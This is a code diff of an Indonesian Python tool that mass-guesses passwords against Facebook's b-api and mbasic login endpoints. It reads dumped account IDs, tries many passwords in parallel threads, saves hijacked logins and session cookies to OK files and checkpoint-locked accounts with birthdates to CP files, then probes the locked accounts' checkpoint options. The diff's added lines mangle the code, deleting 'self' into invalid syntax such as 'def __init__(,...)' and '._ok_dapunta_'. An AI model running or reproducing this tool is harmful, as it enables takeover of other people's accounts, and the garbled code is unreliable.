@@ -38,9 +38,7 @@ __bulan__ = __sekarang__.month
 __hari__  = __sekarang__.day
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 _list_bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
-try:
-    if __bulan__ < 0 or __bulan__ > 12:
-        _cici_cici_()
+t_cici_cici_()
     _bulan_sekarang_ = __bulan__ - 1
 except ValueError:
     _cici_cici_()
@@ -431,54 +429,54 @@ def koki(cookies):
 
 ### Crack Proccess
 class _crack_dev_:
-    def __init__(self,_files_dapunta_):
-        self._Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
-        self._ok_dapunta_ = []
-        self._cp_dapunta_ = []
-        self._hitung_loop_ = 0
+    def __init__(,_files_dapunta_):
+        ._Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
+        ._ok_dapunta_ = []
+        ._cp_dapunta_ = []
+        ._hitung_loop_ = 0
         _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
         while True:
             _pilih_pass_ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
             if _pilih_pass_=="":
                 _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                 time.sleep(2)
-                _menu_dev_(self._Dapunta_Sayang_Cici_)
+                _menu_dev_(._Dapunta_Sayang_Cici_)
             elif _pilih_pass_ in ['m','M','2','02','002']:
                 try:
                     while True:
                         try:
-                            self._file_dump_ = _files_dapunta_
-                            self._open_file_ = _dapunta_dapunta_(self._file_dump_).read().splitlines()
+                            ._file_dump_ = _files_dapunta_
+                            ._open_file_ = _dapunta_dapunta_(._file_dump_).read().splitlines()
                             break
                         except:
                             _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                             time.sleep(2)
-                            _menu_dev_(self._Dapunta_Sayang_Cici_)
-                    self._files_crack_ = []
-                    for _suci_salsabila_ in self._open_file_:
+                            _menu_dev_(._Dapunta_Sayang_Cici_)
+                    ._files_crack_ = []
+                    for _suci_salsabila_ in ._open_file_:
                         try:
-                            self._files_crack_.append({"id":_suci_salsabila_.split("•")[0]})
+                            ._files_crack_.append({"id":_suci_salsabila_.split("•")[0]})
                         except:continue
                 except Exception as e:
                     _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                     time.sleep(2)
-                    _menu_dev_(self._Dapunta_Sayang_Cici_)
+                    _menu_dev_(._Dapunta_Sayang_Cici_)
                 _dapunta_cici_('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(_U_,_P_,_U_,_P_))
-                self.pwlist()
+                .pwlist()
                 break
             elif _pilih_pass_ in ['d','D','1','01','001']:
                 try:
                     while True:
                         try:
-                            self._file_dump_ = _files_dapunta_
-                            self._open_file_ = _dapunta_dapunta_(self._file_dump_).read().splitlines()
+                            ._file_dump_ = _files_dapunta_
+                            ._open_file_ = _dapunta_dapunta_(._file_dump_).read().splitlines()
                             break
                         except:
                             continue
-                    self._files_crack_ = []
-                    for _suci_salsabila_ in self._open_file_:
+                    ._files_crack_ = []
+                    for _suci_salsabila_ in ._open_file_:
                         try:
-                            self._files_crack_.append({"id":_suci_salsabila_.split("•")[0],"pw":_pass_list_(_suci_salsabila_.split("•")[1])})
+                            ._files_crack_.append({"id":_suci_salsabila_.split("•")[0],"pw":_pass_list_(_suci_salsabila_.split("•")[1])})
                         except:continue
                     start_method()
                     put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
@@ -486,58 +484,58 @@ class _crack_dev_:
                     if put in ['']:
                         _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                         time.sleep(2)
-                        _menu_dev_(self._Dapunta_Sayang_Cici_)
+                        _menu_dev_(._Dapunta_Sayang_Cici_)
                     elif put in ['1','01','001','a']:
                         started()
-                        ThreadPool(35).map(self.api,self._files_crack_)
-                        os.remove(self._file_dump_)
+                        ThreadPool(35).map(.api,._files_crack_)
+                        os.remove(._file_dump_)
                         _cici_cici_()
                     elif put in ['2','02','002','b']:
                         started()
-                        ThreadPool(35).map(self.mbasic,self._files_crack_)
-                        os.remove(self._file_dump_)
+                        ThreadPool(35).map(.mbasic,._files_crack_)
+                        os.remove(._file_dump_)
                         _cici_cici_()
                     else:
                         _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                         time.sleep(2)
-                        _menu_dev_(self._Dapunta_Sayang_Cici_)
+                        _menu_dev_(._Dapunta_Sayang_Cici_)
                 except Exception as e:
                     continue
             else:
                 _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                 time.sleep(2)
-                _menu_dev_(self._Dapunta_Sayang_Cici_)
-    def pwlist(self):
-        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_U_,_P_,_U_,_P_)).split(",")
-        if len(self.pw) ==0:
+                _menu_dev_(._Dapunta_Sayang_Cici_)
+    def pwlist():
+        .pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_U_,_P_,_U_,_P_)).split(",")
+        if len(.pw) ==0:
             _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
             time.sleep(2)
-            _menu_dev_(self._Dapunta_Sayang_Cici_)
+            _menu_dev_(._Dapunta_Sayang_Cici_)
         else:
-            for _suci_salsabila_ in self._files_crack_:
-                _suci_salsabila_.update({"pw":self.pw})
+            for _suci_salsabila_ in ._files_crack_:
+                _suci_salsabila_.update({"pw":.pw})
             start_method()
             put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
             _dapunta_cici_(''%())
             if put in ['']:
                 _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                 time.sleep(2)
-                _menu_dev_(self._Dapunta_Sayang_Cici_)
+                _menu_dev_(._Dapunta_Sayang_Cici_)
             elif put in ['1','01','001','a']:
                 started()
-                ThreadPool(30).map(self.api,self._files_crack_)
-                os.remove(self._file_dump_)
+                ThreadPool(30).map(.api,._files_crack_)
+                os.remove(._file_dump_)
                 _cici_cici_()
             elif put in ['2','02','002','b']:
                 started()
-                ThreadPool(30).map(self.mbasic,self._files_crack_)
-                os.remove(self._file_dump_)
+                ThreadPool(30).map(.mbasic,._files_crack_)
+                os.remove(._file_dump_)
                 _cici_cici_()
             else:
                 _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                 time.sleep(2)
-                _menu_dev_(self._Dapunta_Sayang_Cici_)
-    def api(self,_files_crack_):
+                _menu_dev_(._Dapunta_Sayang_Cici_)
+    def api(,_files_crack_):
         try:
             for _suci_salsabila_ in _files_crack_.get("pw"):
                 log = log_api(_files_crack_.get("id"),_suci_salsabila_,"https://b-api.facebook.com")
@@ -549,7 +547,7 @@ class _crack_dev_:
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
                         _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_,d,m,y))
-                        self._cp_dapunta_.append("%s•%s•%s%s%s"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
+                        ._cp_dapunta_.append("%s•%s•%s%s%s"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                         _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                         break
                     except(KeyError, IOError):
@@ -558,20 +556,20 @@ class _crack_dev_:
                         y = " "
                     except:pass
                     _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_))
-                    self._cp_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
+                    ._cp_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                     _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                     break
                 elif log.get("status")=="success":
                     _dapunta_cici_("\r%s[%sOK%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,log.get("cookies")))
-                    self._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
+                    ._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                     _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                     break
                 else:continue
-            self._hitung_loop_+=1
-            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
+            ._hitung_loop_+=1
+            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,._hitung_loop_,len(._files_crack_),_U_,_P_,len(._ok_dapunta_),_U_,_P_,len(._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
         except:
-            self.api(_files_crack_)
-    def mbasic(self,_files_crack_):
+            .api(_files_crack_)
+    def mbasic(,_files_crack_):
         try:
             for _suci_salsabila_ in _files_crack_.get("pw"):
                 log = log_mbasic(_files_crack_.get("id"),_suci_salsabila_,"https://mbasic.facebook.com")
@@ -583,7 +581,7 @@ class _crack_dev_:
                         m,d,y = ttl.split("/")
                         m = bulan_ttl[m]
                         _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_,d,m,y))
-                        self._cp_dapunta_.append("%s•%s•%s%s%s"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
+                        ._cp_dapunta_.append("%s•%s•%s%s%s"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                         _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(_files_crack_.get("id"),_suci_salsabila_,d,m,y))
                         break
                     except(KeyError, IOError):
@@ -592,19 +590,19 @@ class _crack_dev_:
                         y = " "
                     except:pass
                     _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,_files_crack_.get("id"),_suci_salsabila_))
-                    self._cp_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
+                    ._cp_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                     _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                     break
                 elif log.get("status")=="success":
                     _dapunta_cici_("\r%s[%sOK%s] %s • %s • %s     "%(_H_,_P_,_H_,_files_crack_.get("id"),_suci_salsabila_,koki(log.get("cookies"))))
-                    self._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
+                    ._ok_dapunta_.append("%s•%s"%(_files_crack_.get("id"),_suci_salsabila_))
                     _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(_files_crack_.get("id"),_suci_salsabila_))
                     break
                 else:continue
-            self._hitung_loop_+=1
-            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self._hitung_loop_,len(self._files_crack_),_U_,_P_,len(self._ok_dapunta_),_U_,_P_,len(self._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
+            ._hitung_loop_+=1
+            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,._hitung_loop_,len(._files_crack_),_U_,_P_,len(._ok_dapunta_),_U_,_P_,len(._cp_dapunta_),_U_,_P_), end=' ');sys.stdout.flush()
         except:
-            self.mbasic(_files_crack_)
+            .mbasic(_files_crack_)
 
 ### Menu Mengecek Hasil Crack
 def _cek_result_dev_():
@@ -779,37 +777,38 @@ def _var_ugen_(_Dapunta_Cinta_Cici_):
 ### Cek Opsi
 def _cek_opsi_akun_cp_():
 
-    _dapunta_cici_('%s[%s•%s] %sMasukan file Contoh : \033[0;00mCP/%s.txt\n'%(_U_,_P_,_U_,_P_))
-    file = raw_input('%s[%s•%s] %sNama File :\n'%(_U_,_P_,_U_,_P_))
+    _dapunta_cici_('%s[%s!%s] %sMasukan Nama File Contoh : CP/20-Februari-2022'%(_M_,_P_,_M_,_P_))
+    file = raw_input('%s[%s!%s] %sMasukan Nama File :'%(_M_,_P_,_M_,_P_))
+
     if file == '':
-        _dapunta_cici_('%s[%s•%s] %sWronk Input\n'%(_U_,_P_,_U_,_P_)) _cici_cici_()
+        _dapunta_cici_('%s[%s!%s] %sWronk Input'%(_M_,_P_,_M_,_P_))
     
     try:
-        self = open(file, 'r').readlines()
+         = open(file, 'r').readlines()
     except IOError:
-        _dapunta_cici_('%s[%s•%s] %sFile Tidak Ada :(\n'%(_U_,_P_,_U_,_P_)) _cici_cici_()
+        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak ada :( ");exit()
 
-    _dapunta_cici_('\n%s[%s•%s] %sTotal Akun %s Adalah %s Akun'%(len(self)))
-    for yes in self:
+    jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total akun : %s"%(len()))
+    for yes in :
         fl = yes.replace('\n', '')
         ya = fl.split(' • ')
-        _dapunta_cici_('\n%s[%s•%s] %sProses...' + fl.replace(' + ', '')
+        _dapunta_cici_('%s[%s!%s] %sProses'%(_M_,_P_,_M_,_P_)) ' + fl.replace(' + ', '')
         
         try:
             check_in(ya[0].replace(' + ', ''), ya[1])
    #     continue
         except requests.exceptions.ConnectionError:
-            _dapunta_cici_('%s[%s•%s] %sKoneksi Jelek !!!\n'%(_U_,_P_,_U_,_P_)) _cici_cici_()
+            _dapunta_cici_('%s[%s!%s] %sKoneksi Jelek'%(_M_,_P_,_M_,_P_));exit()
             continue
         
 
     
-    _dapunta_cici_('%s[%s•%s] %sSelesai\n'%(_U_,_P_,_U_,_P_)) _cici_cici_()
+    _dapunta_cici_('%s[%s!%s] %sSelesai'%(_M_,_P_,_M_,_P_));exit()
 
 
 def check_in(user, pasw):
     mb = 'https://mbasic.facebook.com'
-    ua = 'Mozilla/5.0 (Linux; Android 4.4.4; SC-01G Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36'
+    ua = 'Android 4.0 Blackberry - Mozilla Firefox 8.0'
     ses = requests.Session()
     ses.headers.update({
         'Host': 'mbasic.facebook.com',
@@ -876,16 +875,16 @@ def check_in(user, pasw):
             'nh': nh }
         parr = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
         proo = [ yy.text for yy in parr.find_all('option') ]
-         _dapunta_cici_('%sTerdapat\n'%(_U_,_P_,_U_,_P_)) + str(len(proo)) + '%sOpsi\n'%(_U_,_P_,_U_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sTerdapat'%(_M_,_P_,_M_,_P_)) + str(len(proo)) + '%sOpsi'%(_M_,_P_,_M_,_P_))
         for opt in range(len(proo)):
-            _dapunta_cici_('\n%s'(_U_,_P_,_U_,_P_)) + str(opt + 1) + '\n%s'(_U_,_P_,_U_,_P_))' + proo[opt]
+            print '  \033[0;33m[\033[0;35m' + str(opt + 1) + '\033[0;33m]\033[0;36m ' + proo[opt]
         
     elif 'login_error' in str(run):
         oh = run.find('div', {
             'id': 'login_error' }).find('div').text
-        _dapunta_cici_('%s' % oh
+        print '\033[0;36m [\033[0;35m+\033[0;36m]\033[0;33m %s' % oh
     else:
-        _dapunta_cici_('%s[%s•%s] %sLogin Gagal Periksa Username atau Password\n'%(_U_,_P_,_U_,_P_))
+        _dapunta_cici_('%s[%s!%s] %sLogin Gagal Periksa Username Atau Password'%(_M_,_P_,_M_,_P_))
 
 ### Tampilan Metode
 def start_method():
